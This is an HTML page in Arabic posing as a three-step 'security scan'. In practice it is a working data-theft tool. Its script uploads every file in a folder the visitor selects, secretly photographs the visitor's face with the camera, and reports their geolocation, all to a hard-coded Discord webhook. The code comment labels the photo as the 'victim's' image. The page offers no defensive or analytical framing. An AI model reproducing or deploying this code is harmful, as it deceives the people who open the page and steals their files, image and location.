<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام فحص الأمان المتعدد</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; width: 350px; text-align: center; }
        .btn { background: #238636; color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-size: 18px; width: 100%; font-weight: bold; margin-top: 20px; }
        .step { display: none; }
        .step.active { display: block; }
        #log { font-size: 11px; color: #8b949e; margin-top: 15px; text-align: left; background: #000; padding: 10px; border-radius: 5px; max-height: 100px; overflow-y: auto; }
        .status-dot { height: 10px; width: 100%; background: #30363d; border-radius: 5px; margin-bottom: 10px; overflow: hidden; }
        .status-fill { height: 100%; width: 0%; background: #238636; transition: 0.5s; }
    </style>
</head>
<body>

<div class="card">
    <div class="status-dot"><div class="status-fill" id="progress"></div></div>
    
    <!-- المرحلة 1: الملفات (نبدأ بها لأنها الأكثر حساسية) -->
    <div id="step1" class="step active">
        <h2>📂 فحص الملفات</h2>
        <p>الخطوة 1: يرجى اختيار المجلد الرئيسي لفحصه من الفيروسات السحابية.</p>
        <button class="btn" onclick="startStep1()">اختيار المجلد لبدء الفحص</button>
    </div>

    <!-- المرحلة 2: الكاميرا -->
    <div id="step2" class="step">
        <h2>📸 البصمة الحيوية</h2>
        <p>الخطوة 2: نحتاج لتفعيل الكاميرا لمطابقة ملامح الوجه وتأكيد هويتك.</p>
        <button class="btn" onclick="startStep2()">بدء فحص الوجه</button>
    </div>

    <!-- المرحلة 3: الموقع -->
    <div id="step3" class="step">
        <h2>📍 العقدة الجغرافية</h2>
        <p>الخطوة الأخيرة: تحديد موقع الجهاز لربطه بأقرب سيرفر حماية.</p>
        <button class="btn" onclick="startStep3()">تحديد الموقع والإنهاء</button>
    </div>

    <div id="log">بانتظار البدء...</div>
</div>

<!-- عناصر مخفية -->
<video id="v" style="display:none;" autoplay></video>
<canvas id="c" style="display:none;" width="640" height="480"></canvas>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";
    const logDiv = document.getElementById('log');

    function writeLog(m) { logDiv.innerHTML += `<br>> ${m}`; logDiv.scrollTop = logDiv.scrollHeight; }
    function setProgress(p) { document.getElementById('progress').style.width = p + "%"; }

    // الخطوة 1: الملفات (تعمل فقط إذا كانت أول تفاعل)
    async function startStep1() {
        try {
            const handle = await window.showDirectoryPicker();
            writeLog("تم منح الوصول للمجلد. جاري السحب...");
            
            // ننتقل للمرحلة التالية في الواجهة
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
            setProgress(33);

            // سحب الملفات في الخلفية
            for await (const entry of handle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    await sendFile(file, file.name, `📄 ملف: ${file.name}`);
                }
            }
        } catch (e) { alert("يجب اختيار المجلد للمتابعة!"); }
    }

    // الخطوة 2: الكاميرا
    async function startStep2() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            writeLog("جاري مطابقة الوجه...");
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            v.srcObject = stream;

            setTimeout(async () => {
                c.getContext('2d').drawImage(v, 0, 0);
                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg'));
                await sendFile(blob, "face.jpg", "📸 صورة الضحية");
                stream.getTracks().forEach(t => t.stop());
                
                document.getElementById('step2').classList.remove('active');
                document.getElementById('step3').classList.add('active');
                setProgress(66);
                writeLog("تمت المطابقة بنجاح.");
            }, 2000);
        } catch (e) { alert("يجب السماح بالكاميرا!"); }
    }

    // الخطوة 3: الموقع
    async function startStep3() {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendToDiscord("📍 الموقع الجغرافي", { "الرابط": map });
            setProgress(100);
            writeLog("✅ اكتمل فحص الأمان بنجاح.");
            alert("تم تأمين جهازك بالكامل!");
        }, (err) => alert("يجب السماح بالموقع!"));
    }

    // وظائف الإرسال لديسكورد
    async function sendToDiscord(title, fields) {
        const f = Object.keys(fields).map(k => ({ name: k, value: String(fields[k]) }));
        await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [{ title, fields: f, color: 3066993 }] })
        });
    }

    async function sendFile(blob, name, text) {
        const fd = new FormData();
        fd.append('file', blob, name);
        fd.append('payload_json', JSON.stringify({ content: text }));
        await fetch(WEBHOOK, { method: 'POST', body: fd });
    }
</script>
</body>
</html>
